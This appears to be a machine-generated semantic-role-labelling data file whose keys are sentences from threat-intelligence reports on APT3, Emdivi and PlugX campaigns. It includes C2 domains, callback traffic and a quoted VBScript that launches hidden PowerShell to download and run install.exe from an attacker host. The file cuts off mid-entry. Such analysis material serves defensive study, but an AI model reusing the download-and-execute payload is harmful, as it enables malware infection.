SOCKS5 connection request \"05 01 00\" and verifies the server response\nstarts with \"05 00\"": {"sends": {"ARG0": {"text": "The malware"}, "V": {"text": "sends", "index": 2}, "ARG1": {"text": "the SOCKS5 connection request \" 05 01 00"}}, "starts": {"ARG1": {"text": "the server response"}, "V": {"text": "starts", "index": 17}, "ARGM-MNR": {"text": "with \" 05 00 \""}}}, " CVE-2014-\n4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14": {"is": {"ARG1": {"text": "CVE-2014- 4113"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a privilege escalation vulnerability that was disclosed publicly on 2014 - 10 - 14"}}, "was": {"V": {"text": "was", "index": 8}}, "disclosed": {"ARG1": {"text": "a privilege escalation vulnerability"}, "R-ARG1": {"text": "that"}, "V": {"text": "disclosed", "index": 9}, "ARGM-MNR": {"text": "publicly"}, "ARGM-LOC": {"text": "on 2014 - 10 - 14"}}}, "\n\nOnce the connection to the server is established, the malware expects a message containing at least three\nbytes from the server": {"is": {"V": {"text": "is", "index": 6}}, "established": {"ARG1": {"text": "the connection to the server"}, "V": {"text": "established", "index": 7}}, "expects": {"ARGM-TMP": {"text": "Once the connection to the server is established"}, "ARG0": {"text": "the malware"}, "V": {"text": "expects", "index": 11}, "ARG1": {"text": "a message containing at least three bytes from the server"}}, "containing": {"ARG0": {"text": "a message"}, "V": {"text": "containing", "index": 14}, "ARG1": {"text": "at least three bytes from the server"}}}, "\n\nThe first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe\nwith the elevated privileges": {"dropped": {"ARGM-TMP": {"text": "first"}, "V": {"text": "dropped", "index": 2}, "ARG1": {"text": "file"}}, "contains": {"ARG0": {"text": "The first dropped file , doc.exe ,"}, "V": {"text": "contains", "index": 7}, "ARG1": {"text": "the CVE-2014 - 4113 exploit"}}, "attempts": {"ARG0": {"text": "The first dropped file , doc.exe ,"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "attempts", "index": 15}, "ARG1": {"text": "to execute test.exe with the elevated privileges"}}, "execute": {"ARG0": {"text": "The first dropped file , doc.exe ,"}, "V": {"text": "execute", "index": 17}, "ARG1": {"text": "test.exe"}, "ARG2": {"text": "with the elevated privileges"}}}, " This CVE is\na local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the\nmachine": {"is": {"ARG1": {"text": "This CVE"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a local kernel vulnerability that , with successful exploitation , would give any user SYSTEM access on the machine"}}, "would": {"ARGM-MNR": {"text": "with successful exploitation"}, "V": {"text": "would", "index": 13}, "ARG1": {"text": "give any user SYSTEM access on the machine"}}, "give": {"ARG0": {"text": "a local kernel vulnerability"}, "R-ARG0": {"text": "that"}, "ARGM-MNR": {"text": "with successful exploitation"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "give", "index": 14}, "ARG2": {"text": "any user SYSTEM"}, "ARG1": {"text": "access on the machine"}}}, "\n\nThis IP has hosted other domains used by APT3 in past campaigns:\n<table>\n DOMAIN                     FIRST SEEN     LAST SEEN        IP ADDRESS\n join.playboysplus[.]com    2014-11-21     2014-11-21       104.151.248.173\n walterclean[.]com          2014-11-18     2014-11-20       104.151.248.173\n www.walterclean[.]com      2014-11-18     2014-11-20       104.151.248.173\n</table>\nAs we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a\nPlugx/Kaba command and control server": {"has": {"V": {"text": "has", "index": 2}}, "hosted": {"ARG0": {"text": "This IP"}, "V": {"text": "hosted", "index": 3}, "ARG1": {"text": "other domains used by APT3 in past campaigns"}}, "used": {"ARG1": {"text": "other domains"}, "V": {"text": "used", "index": 6}, "ARG0": {"text": "by APT3"}, "ARGM-LOC": {"text": "in past campaigns"}}, "discussed": {"ARG1": {"text": "we"}, "V": {"text": "discussed", "index": 15}, "ARGM-LOC": {"text": "in our previous blog detailing previous APT3 activity"}}, "detailing": {"ARG0": {"text": "our previous blog"}, "V": {"text": "detailing", "index": 20}, "ARG1": {"text": "previous APT3 activity"}}, "served": {"ARGM-TMP": {"text": "As we discussed in our previous blog detailing previous APT3 activity"}, "ARG0": {"text": "the walterclean[.]com"}, "V": {"text": "served", "index": 27}, "ARG1": {"text": "as a Plugx / Kaba command and control server"}}}, "\n</section>\n<section>\n<heading>Conclusion</heading>\n\nAlthough APT3 is well known for employing zero-day exploits in their attacks, recent activity has\ndemonstrated that they will also attack targets with known exploits or social engineering": {"is": {"V": {"text": "is", "index": 2}}, "employing": {"V": {"text": "employing", "index": 6}, "ARG1": {"text": "zero - day exploits"}, "ARGM-LOC": {"text": "in their attacks"}}, "has": {"V": {"text": "has", "index": 17}}, "demonstrated": {"ARGM-ADV": {"text": "Although APT3 is well known for employing zero - day exploits in their attacks"}, "ARG0": {"text": "recent activity"}, "V": {"text": "demonstrated", "index": 18}, "ARG1": {"text": "that they will also attack targets with known exploits or social engineering"}}, "will": {"ARG0": {"text": "they"}, "V": {"text": "will", "index": 21}, "ARGM-DIS": {"text": "also"}, "ARG1": {"text": "attack targets with known exploits or social engineering"}}, "attack": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "attack", "index": 23}, "ARG1": {"text": "targets with known exploits or social engineering"}}, "known": {"V": {"text": "known", "index": 26}, "ARG1": {"text": "exploits"}}}, " CVE-2014-6332 was disclosed publicly on\n2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability": {"was": {"V": {"text": "was", "index": 3}}, "disclosed": {"ARG1": {"text": "CVE-2014 - 6332"}, "V": {"text": "disclosed", "index": 4}, "ARGM-MNR": {"text": "publicly"}, "ARGM-TMP": {"text": "on 2014 - 11 - 11"}}, "is": {"ARG1": {"text": "CVE-2014 - 6332"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "a Windows OLE Automation Array Remote Code Execution vulnerability"}}}, "\n\nThe webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the\naffected users\u2019 system to download the below payload:\n<code>\n\n  function runmumaa()\n\n  On Error Resume Next\n\n  set shell=createobject(\"Shell.Application\")\n\n  shell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile             -NonInteractive -WindowStyle\nHidden ( New-Object\n\u201cSystem.Net.WebClient\u201d).DownloadFile(\u201chttp://www.playboysplus.com\n\f/install/install.exe\u201d,\u201dinstall.exe\u201d);Invoke-Item install.exe\", \"\",   \"open\", 1\n\n  end function\n</code>\nThe CVE-2014-6332 exploit code seen in this incident is derived from the code published at\nhttp://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project": {"contained": {"ARG0": {"text": "The webpage"}, "V": {"text": "contained", "index": 2}, "ARG1": {"text": "both CVE-2014 - 6332 exploit code and a VBScript that invoked PowerShell on the affected users \u2019 system to download the below payload"}}, "invoked": {"ARG0": {"text": "a VBScript"}, "R-ARG0": {"text": "that"}, "V": {"text": "invoked", "index": 13}, "ARG1": {"text": "PowerShell"}, "ARG4": {"text": "on the affected users \u2019 system"}, "ARGM-PRP": {"text": "to download the below payload"}}, "affected": {"V": {"text": "affected", "index": 17}, "ARG1": {"text": "users \u2019 system"}}, "download": {"ARG0": {"text": "invoked PowerShell"}, "V": {"text": "download", "index": 22}, "ARG1": {"text": "the below payload"}}, "seen": {"ARG1": {"text": "The CVE-2014 - 6332 exploit code"}, "V": {"text": "seen", "index": 33}, "ARGM-LOC": {"text": "in this incident"}}, "is": {"V": {"text": "is", "index": 37}}, "derived": {"ARG1": {"text": "The CVE-2014 - 6332 exploit code seen in this incident"}, "V": {"text": "derived", "index": 38}, "ARG2": {"text": "from the code published at http://www.exploit-db.com/exploits/35230/ , which has also been incorporated in the Metasploit project"}}, "published": {"ARG1": {"text": "the code"}, "V": {"text": "published", "index": 42}, "ARGM-TMP": {"text": "at http://www.exploit-db.com/exploits/35230// has also been incorporated in the Metasploit project"}}, "has": {"V": {"text": "has", "index": 47}}, "been": {"V": {"text": "been", "index": 49}}, "incorporated": {"ARG1": {"text": "http://www.exploit-db.com/exploits/35230/"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "incorporated", "index": 50}, "ARG2": {"text": "in the Metasploit project"}}}, " Type S is a .NET application based\non the same source code and shared C&C infrastructure as Type T": {"is": {"ARG1": {"text": "Type S"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a .NET application based on the same source code"}}, "based": {"ARG1": {"text": "a .NET application"}, "V": {"text": "based", "index": 6}, "ARG2": {"text": "on the same source code and shared C&C infrastructure as Type T"}}, "shared": {"V": {"text": "shared", "index": 13}, "ARG1": {"text": "C&C infrastructure"}, "ARG2": {"text": "as Type T"}}}, " Emdivi allows the remote\nattacker executing the commands to send the results back to the command-and-control (C&C) server\nthrough HTTP": {"allows": {"ARG0": {"text": "Emdivi"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "the remote attacker executing the commands to send the results back to the command - and - control ( C&C ) server through HTTP"}}, "executing": {"ARG0": {"text": "the remote attacker"}, "V": {"text": "executing", "index": 5}, "ARG1": {"text": "the commands"}, "ARGM-PRP": {"text": "to send the results back to the command"}, "ARG3": {"text": "- and - control ( C&C ) server through HTTP"}}, "send": {"V": {"text": "send", "index": 9}, "ARG1": {"text": "the results"}, "ARG2": {"text": "back to the command - and - control ( C&C ) server"}, "ARGM-MNR": {"text": "through HTTP"}}}, " This is merely to trick the recipient into believing the email is from a\nlegitimate and trustworthy source": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARGM-ADV": {"text": "merely"}, "ARG2": {"text": "to trick the recipient into believing the email is from a legitimate and trustworthy source"}}, "trick": {"ARG0": {"text": "This"}, "V": {"text": "trick", "index": 4}, "ARG1": {"text": "the recipient"}, "ARG2": {"text": "into believing the email is from a legitimate and trustworthy source"}}, "believing": {"V": {"text": "believing", "index": 8}, "ARG1": {"text": "the email is from a legitimate and trustworthy source"}}, "is_2": {"ARG1": {"text": "the email"}, "V": {"text": "is", "index": 11}, "ARG2": {"text": "from a legitimate and trustworthy source"}}}, " The malware adds extra words to the version number and then, based on this,\ngenerates a hash, which it uses as an encryption key": {"adds": {"ARG0": {"text": "The malware"}, "V": {"text": "adds", "index": 2}, "ARG1": {"text": "extra words"}, "ARG2": {"text": "to the version number"}}, "based": {"V": {"text": "based", "index": 12}, "ARG2": {"text": "on this"}}, "generates": {"ARG0": {"text": "The malware"}, "ARGM-TMP": {"text": "then"}, "ARGM-DIS": {"text": "based on this"}, "V": {"text": "generates", "index": 16}, "ARG1": {"text": "a hash , which it uses as an encryption key"}}, "uses": {"ARG1": {"text": "a hash"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 22}, "ARG2": {"text": "as an encryption key"}}}, " Opening the malicious attachment\nwith Ichitaro will drop the payload and display the document": {"Opening": {"V": {"text": "Opening", "index": 0}, "ARG1": {"text": "the malicious attachment with Ichitaro"}}, "will": {"ARG0": {"text": "Opening the malicious attachment with Ichitaro"}, "V": {"text": "will", "index": 6}, "ARG1": {"text": "drop the payload"}}, "drop": {"ARG0": {"text": "Opening the malicious attachment with Ichitaro"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "drop", "index": 7}, "ARG1": {"text": "the payload"}}, "display": {"ARG0": {"text": "Opening the malicious attachment with Ichitaro"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "display", "index": 11}, "ARG1": {"text": "the document"}}}, "\n\nThe exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file\nattached, which Symantec products detect as Bloodhound.Exploit.557": {"is": {"V": {"text": "is", "index": 2}}, "sent": {"ARG1": {"text": "The exploit"}, "V": {"text": "sent", "index": 3}, "ARG2": {"text": "to the targeted organizations"}, "ARGM-MNR": {"text": "through emails with a malicious Ichitaro document file attached , which Symantec products detect as Bloodhound . Exploit.557"}}, "targeted": {"V": {"text": "targeted", "index": 6}, "ARG1": {"text": "organizations"}}, "attached": {"ARG1": {"text": "a malicious Ichitaro document file"}, "V": {"text": "attached", "index": 16}}, "detect": {"ARG1": {"text": "a malicious Ichitaro document file attached"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "Symantec products"}, "V": {"text": "detect", "index": 21}, "ARGM-MNR": {"text": "as Bloodhound"}, "ARGM-EXT": {"text": ". Exploit.557"}}, "Exploit.557": {"ARG1": {"text": "a malicious Ichitaro document file attached"}, "R-ARG1": {"text": "which"}, "V": {"text": "Exploit.557", "index": 25}}}, " Type T also\ndetects the presence of automatic analysis systems or debuggers, such as the following:\n<list>\n      VirtualMachine\n      Debugger\n      Sandbox\n</list>\nType S, on the other hand, was used only twice in the attack campaign": {"detects": {"ARG0": {"text": "Type T"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "detects", "index": 3}, "ARG1": {"text": "the presence of automatic analysis systems or debuggers , such as the following : Type S , on the other hand , was used only twice in the attack campaign"}}, "following": {"V": {"text": "following", "index": 16}, "ARG1": {"text": "Type S"}}, "was": {"V": {"text": "was", "index": 26}}, "used": {"ARG1": {"text": "Type S"}, "ARGM-ADV": {"text": "on the other hand"}, "V": {"text": "used", "index": 27}, "ARGM-TMP": {"text": "only twice"}, "ARGM-LOC": {"text": "in the attack campaign"}}}, " Attached \u201cdocument\u201d is actually a malicious executable file</caption>\n</section>\n<section>\n<heading>Payload</heading>\nThe malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised\ncomputer": {"Attached": {"V": {"text": "Attached", "index": 0}, "ARG1": {"text": "\u201c document \u201d"}}, "is": {"ARG1": {"text": "Attached \u201c document \u201d"}, "V": {"text": "is", "index": 4}, "ARGM-ADV": {"text": "actually"}, "ARG2": {"text": "a malicious executable file The malicious payload is Backdoor . Emdivi , a threat that opens a back door on the compromised computer"}}, "is_2": {"ARG1": {"text": "The malicious payload"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "Backdoor"}}, "opens": {"ARG2": {"text": "a threat"}, "R-ARG0": {"text": "that"}, "V": {"text": "opens", "index": 21}, "ARG1": {"text": "a back door"}, "ARGM-LOC": {"text": "on the compromised computer"}}, "compromised": {"V": {"text": "compromised", "index": 27}, "ARG1": {"text": "computer"}}}, " Type T employs\ntechniques to protect itself from security vendors or network administrators": {"employs": {"V": {"text": "employs", "index": 2}, "ARG1": {"text": "techniques to protect itself from security vendors or network administrators"}}, "protect": {"V": {"text": "protect", "index": 5}, "ARG1": {"text": "itself"}, "ARG2": {"text": "from security vendors or network administrators"}}}, " The email also requests that the recipient open the attachment on a Windows computer": {"requests": {"ARG0": {"text": "The email"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "requests", "index": 3}, "ARG1": {"text": "that the recipient open the attachment on a Windows computer"}}, "open": {"ARG0": {"text": "the recipient"}, "V": {"text": "open", "index": 7}, "ARG1": {"text": "the attachment on a Windows computer"}}}, " Payloads from the exploit may\ninclude Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell; however, all payloads aim to steal\nconfidential information from the compromised computer": {"may": {"V": {"text": "may", "index": 4}}, "include": {"ARG2": {"text": "Payloads from the exploit"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "include", "index": 5}, "ARG1": {"text": "Backdoor . Emdivi , Backdoor . Korplug , and Backdoor . ZXshell"}}, "aim": {"ARG0": {"text": "all payloads"}, "V": {"text": "aim", "index": 23}, "ARG1": {"text": "to steal confidential information from the compromised computer"}}, "steal": {"ARG0": {"text": "all payloads"}, "V": {"text": "steal", "index": 25}, "ARG1": {"text": "confidential information"}, "ARG2": {"text": "from the compromised computer"}}, "compromised": {"V": {"text": "compromised", "index": 30}, "ARG1": {"text": "computer"}}}, " Once successfully exploited, the file installed Backdoor.Emdivi": {"exploited": {"ARGM-TMP": {"text": "Once"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "exploited", "index": 2}, "ARGM-PRD": {"text": "the file installed Backdoor"}, "ARG2": {"text": "Emdivi"}}, "installed": {"ARGM-TMP": {"text": "Once successfully exploited"}, "ARG2": {"text": "the file"}, "V": {"text": "installed", "index": 6}}}, " Mostly the attachments are in a simple executable format with a fake icon": {"are": {"ARGM-EXT": {"text": "Mostly"}, "ARG1": {"text": "the attachments"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "in a simple executable format with a fake icon"}}}, " Japanese text used by Emdivi Type S variant</caption>\n</section>\n<section>\n<heading>Who is Emdivi talking to?</heading>\nOnce infected, Emdivi connects to hardcoded C&C servers using the HTTP protocol": {"used": {"ARG1": {"text": "Japanese"}, "V": {"text": "used", "index": 2}, "ARG0": {"text": "by Emdivi Type S variant Once infected"}}, "infected": {"ARG2": {"text": "Japanese text used by Emdivi Type S variant"}, "ARGM-TMP": {"text": "Once"}, "V": {"text": "infected", "index": 9}, "ARG1": {"text": "Emdivi connects to hardcoded C&C"}, "ARGM-ADV": {"text": "servers using the HTTP protocol"}}, "connects": {"ARG0": {"text": "Emdivi"}, "V": {"text": "connects", "index": 12}, "ARG1": {"text": "to hardcoded C&C servers using the HTTP protocol"}}, "hardcoded": {"V": {"text": "hardcoded", "index": 14}, "ARG1": {"text": "C&C servers"}, "ARGM-MNR": {"text": "using the HTTP protocol"}}, "using": {"ARG0": {"text": "hardcoded C&C servers"}, "V": {"text": "using", "index": 17}, "ARG1": {"text": "the HTTP protocol"}}}, " Instead,\nthe attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for\nBackdoor.Emdivi": {"penetrated": {"ARGM-DIS": {"text": "Instead"}, "ARG0": {"text": "the attacker"}, "ARGM-MNR": {"text": "somehow"}, "V": {"text": "penetrated", "index": 5}, "ARG1": {"text": "the cloud service itself"}}, "turned": {"ARGM-DIS": {"text": "Instead"}, "ARG0": {"text": "the attacker"}, "ARGM-MNR": {"text": "somehow/ for Backdoor"}, "V": {"text": "turned", "index": 11}, "ARG1": {"text": "the websites"}, "ARG2": {"text": "into C&C servers"}, "ARGM-PRD": {"text": "Emdivi"}}}, " This group\u2019s primary goal is to steal confidential information from\ntargeted organizations": {"is": {"ARG1": {"text": "This group \u2019s primary goal"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to steal confidential information from targeted organizations"}}, "steal": {"ARG0": {"text": "This group \u2019s primary goal"}, "V": {"text": "steal", "index": 7}, "ARG1": {"text": "confidential information"}, "ARG2": {"text": "from targeted organizations"}}, "targeted": {"V": {"text": "targeted", "index": 11}, "ARG1": {"text": "organizations"}}}, " In this campaign, variants of\nBackdoor.Emdivi are persistently used as a payload": {"are": {"V": {"text": "are", "index": 9}}, "used": {"ARGM-LOC": {"text": "In this campaign"}, "ARG1": {"text": "variants of Backdoor . Emdivi"}, "ARGM-MNR": {"text": "persistently"}, "V": {"text": "used", "index": 11}, "ARG2": {"text": "as a payload"}}}, " The attackers sent a Microsoft Word file containing a maliciously crafted SWF file\nthat exploited the vulnerability": {"sent": {"ARG0": {"text": "The attackers"}, "V": {"text": "sent", "index": 2}, "ARG1": {"text": "a Microsoft Word file containing a maliciously crafted SWF file that exploited the vulnerability"}}, "containing": {"ARG0": {"text": "a Microsoft Word file"}, "V": {"text": "containing", "index": 7}, "ARG1": {"text": "a maliciously crafted SWF file that exploited the vulnerability"}}, "crafted": {"ARGM-MNR": {"text": "maliciously"}, "V": {"text": "crafted", "index": 10}, "ARG1": {"text": "SWF file"}}, "exploited": {"ARG0": {"text": "a maliciously crafted SWF file"}, "R-ARG0": {"text": "that"}, "V": {"text": "exploited", "index": 14}, "ARG1": {"text": "the vulnerability"}}}, " Malformed SWF file used in the LadyBoyle campaign in February 2013</caption>\n\nBoth attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door": {"used": {"ARG1": {"text": "Malformed SWF file"}, "V": {"text": "used", "index": 3}, "ARG2": {"text": "in the LadyBoyle campaign"}, "ARGM-TMP": {"text": "in February"}}, "use": {"ARG0": {"text": "Both attacks"}, "V": {"text": "use", "index": 13}, "ARG1": {"text": "a .doc file"}, "ARG2": {"text": "containing an Adobe Flash zero - day exploit that is used to install a back door"}}, "containing": {"ARG0": {"text": "a .doc file"}, "V": {"text": "containing", "index": 17}, "ARG1": {"text": "an Adobe Flash zero - day exploit that is used to install a back door"}}, "is": {"V": {"text": "is", "index": 26}}, "used_2": {"ARG1": {"text": "an Adobe Flash zero - day exploit"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 27}, "ARG2": {"text": "to install a back door"}}, "install": {"ARG0": {"text": "that"}, "V": {"text": "install", "index": 29}, "ARG1": {"text": "a back door"}}}, " All attacks arrive on the target computers as an\nattachment to email messages": {"arrive": {"ARG1": {"text": "All attacks"}, "V": {"text": "arrive", "index": 2}, "ARG4": {"text": "on the target computers"}, "ARGM-PRP": {"text": "as an attachment to email messages"}}, "email": {"V": {"text": "email", "index": 11}, "ARG1": {"text": "messages"}}}, " The emails include password-protected .zip files containing the malware": {"include": {"ARG2": {"text": "The emails"}, "V": {"text": "include", "index": 2}, "ARG1": {"text": "password - protected .zip files containing the malware"}}, "protected": {"ARGM-MNR": {"text": "password"}, "V": {"text": "protected", "index": 5}}, "containing": {"V": {"text": "containing", "index": 8}, "ARG1": {"text": "the malware"}}}, " Important parts of Type T,\n\fsuch as the C&C server address it contacts and its protection mechanisms, are encrypted": {"contacts": {"ARG1": {"text": "the C&C server address"}, "V": {"text": "contacts", "index": 13}}, "are": {"ARG1": {"text": "Important parts of Type T , such as the C&C server address it contacts and its protection mechanisms"}, "V": {"text": "are", "index": 19}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "Important parts of Type T , such as the C&C server address it contacts and its protection mechanisms ,"}, "V": {"text": "encrypted", "index": 20}}}, "\n\nThis PlugX payload was configured with the following command-and-control (CnC) domains:\n<list>\n      java.ns1[.]name\n      adservice.no-ip[.]org\n      wmi.ns01[.]us\n</list>\nSample callback traffic was as follows:\n<list>\n    POST /D28419029043311C6F8BF9F5 HTTP/1.1\n    Accept: */*\n    HHV1: 0\n    HHV2: 0\n    HHV3: 61456\n    HHV4: 1\n    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;\n    InfoPath.2; .NET CLR 2.0.50727; SV1)\n    Host: java.ns1.name\n    Content-Length: 0\n    Connection: Keep-Alive\n    Cache-Control: no-cache\n</list>\n</section>\n<section>\n<heading>Campaign analysis</heading>\n\nBoth java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb": {"was": {"ARG1": {"text": "This PlugX payload"}, "V": {"text": "was", "index": 3}, "ARG2": {"text": "configured with the following command - and - control ( CnC ) domains"}}, "configured": {"ARG1": {"text": "This PlugX payload"}, "V": {"text": "configured", "index": 4}, "ARGM-MNR": {"text": "with the following command - and - control ( CnC ) domains"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "command - and - control ( CnC ) domains"}}, "domains": {"ARG1": {"text": "command - and - control ( CnC"}, "ARGM-ADJ": {"text": ")"}, "V": {"text": "domains", "index": 16}}, "resolved": {"ARG0": {"text": "Both java.ns1[.]name and adservice.no-ip[.]org"}, "V": {"text": "resolved", "index": 22}, "ARG1": {"text": "to 74.126.177.68"}, "ARGM-TMP": {"text": "on Feb"}}}, " Once ROP marks the shellcode as executable\nusing Windows\u2019 VirtualProtect function, it downloads an executable via the InternetOpenURLA and\nInternetReadFile functions": {"marks": {"ARG0": {"text": "ROP"}, "V": {"text": "marks", "index": 2}, "ARG1": {"text": "the shellcode as executable using Windows \u2019 VirtualProtect function"}}, "using": {"ARG0": {"text": "executable"}, "V": {"text": "using", "index": 7}, "ARG1": {"text": "Windows \u2019 VirtualProtect function"}}, "downloads": {"ARGM-TMP": {"text": "Once ROP marks the shellcode as executable using Windows \u2019 VirtualProtect function"}, "ARG0": {"text": "it"}, "V": {"text": "downloads", "index": 14}, "ARG1": {"text": "an executable"}, "ARGM-MNR": {"text": "via the InternetOpenURLA and InternetReadFile functions"}}}, "\n\nOn Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the\nuser has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has\nMicrosoft Office 2007 or 2010": {"use": {"ARGM-LOC": {"text": "On Windows 7"}, "ARG0": {"text": "the attackers"}, "V": {"text": "use", "index": 6}, "ARG1": {"text": "a hard - coded ROP chain"}, "ARG2": {"text": "for MSVCR71.dll ( Visual C++ runtime )"}, "ARGM-ADV": {"text": "if the user has Java 1.6"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 10}, "ARG1": {"text": "ROP chain"}}, "has": {"V": {"text": "has", "index": 23}}, "coded_2": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 31}, "ARG1": {"text": "ROP chain"}}, "has_2": {"ARG0": {"text": "the user"}, "V": {"text": "has", "index": 45}, "ARG1": {"text": "Microsoft Office 2007 or 2010"}}}, "\n<table>\nDomain                  First Seen    Last Seen        IP Address\nadservice.no-ip[.]org   2014-02-18    2014-02-19       74.126.177.68\njava.ns1[.]name         2014-02-18    2014-02-19       74.126.177.68\njava.ns1[.]name         2014-02-18    2014-02-18       192.74.246.219\nwmi.ns01[.]us           2014-02-17    2014-02-17       192.74.246.219\nproxy.ddns[.]info       2013-05-02    2014-02-18       103.246.246.103\n\fupdatedns.ns02[.]us 2013-09-06       2013-09-06      103.246.246.103\nupdatedns.ns01[.]us 2013-09-06       2013-09-06      103.246.246.103\nwmi.ns01[.]us       2013-07-04       2013-07-15      103.246.246.103\n</table>\nFurther research uncovered a number of older malware samples connecting to the same domain\nwmi.ns01[.]us": {"uncovered": {"ARG0": {"text": "Further research"}, "V": {"text": "uncovered", "index": 2}, "ARG1": {"text": "a number of older malware samples connecting to the same domain wmi.ns01[.]us"}}, "connecting": {"ARG1": {"text": "older malware samples"}, "V": {"text": "connecting", "index": 9}, "ARG2": {"text": "to the same domain wmi.ns01[.]us"}}}, " Peterson Institute for International Economics\n(www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden\niframe": {"were": {"V": {"text": "were", "index": 8}}, "redirected": {"ARG1": {"text": "Peterson Institute for International Economics ( www.piie[.]com )"}, "V": {"text": "redirected", "index": 9}, "ARG2": {"text": "to an exploit server hosting this Flash zero - day"}, "ARGM-MNR": {"text": "through a hidden"}, "ARGM-ADV": {"text": "iframe"}}, "hosting": {"ARG0": {"text": "Peterson Institute for International Economics ( www.piie[.]com )"}, "V": {"text": "hosting", "index": 14}, "ARG1": {"text": "this Flash zero - day"}, "ARGM-MNR": {"text": "through a hidden"}, "ARGM-ADV": {"text": "iframe"}}, "hidden": {"V": {"text": "hidden", "index": 22}}}, "\n\nIn what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the\ncurrent Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013": {"is": {"ARG1": {"text": "what"}, "V": {"text": "is", "index": 2}, "ARGM-ADV": {"text": "certainly"}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "a coincidence"}}, "observed": {"ARGM-ADV": {"text": "In what is certainly not a coincidence/ also"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 10}, "ARG1": {"text": "www.arce[.]org ( one of the sites redirecting to the current Flash exploit ) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013"}}, "redirecting": {"ARG0": {"text": "www.arce[.]org ( one of the sites"}, "V": {"text": "redirecting", "index": 17}, "ARG1": {"text": "to the current Flash exploit"}}, "redirect": {"ARG0": {"text": "one of the sites"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "redirect", "index": 25}, "ARG1": {"text": "visitors"}, "ARG2": {"text": "to the Java exploit on shop.fujifilm[.]be"}}}, "\n\nAs of this blog post, visitors to at least three nonprofit institutions \u2014 two of which focus on matters of\nnational security and public policy \u2014 were redirected to an exploit server hosting the zero-day exploit": {"focus": {"R-ARG0": {"text": "this/ \u2014 two of which"}, "ARG0": {"text": "at least three nonprofit institutions"}, "V": {"text": "focus", "index": 17}, "ARG2": {"text": "on matters of national security and public policy \u2014"}}, "were": {"V": {"text": "were", "index": 27}}, "redirected": {"ARG1": {"text": "visitors to at/ institutions \u2014 two of which/ focus on matters of national security and public policy \u2014"}, "V": {"text": "redirected", "index": 28}, "ARG2": {"text": "to an exploit server hosting the zero - day exploit"}}, "hosting": {"V": {"text": "hosting", "index": 33}, "ARG1": {"text": "the zero - day exploit"}}}, "\n</section>\n\f\n<section>\n<heading>PlugX/Kaba payload analysis</heading>\n\nOnce the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash\n507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint": {"succeeds": {"ARG1": {"text": "the exploit"}, "V": {"text": "succeeds", "index": 3}}, "is": {"V": {"text": "is", "index": 21}}, "installed": {"ARGM-TMP": {"text": "Once the exploit succeeds"}, "ARG1": {"text": "a PlugX / Kaba remote access tool ( RAT ) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b"}, "V": {"text": "installed", "index": 22}, "ARG2": {"text": "on the compromised endpoint"}}}, "\n</section>\n<section>\n<heading>Shellcode analysis</heading>\n\nThe shellcode is downloaded in ActionScript as a GIF image": {"is": {"V": {"text": "is", "index": 2}}, "downloaded": {"ARG1": {"text": "The shellcode"}, "V": {"text": "downloaded", "index": 3}, "ARGM-LOC": {"text": "in ActionScript"}, "ARGM-PRD": {"text": "as a GIF image"}}}, " Then it writes the file to disk with CreateFileA and WriteFile functions": {"writes": {"ARGM-TMP": {"text": "Then"}, "ARG0": {"text": "it"}, "V": {"text": "writes", "index": 2}, "ARG1": {"text": "the file to disk with CreateFileA and WriteFile functions"}}, "disk": {"V": {"text": "disk", "index": 6}, "ARGM-MNR": {"text": 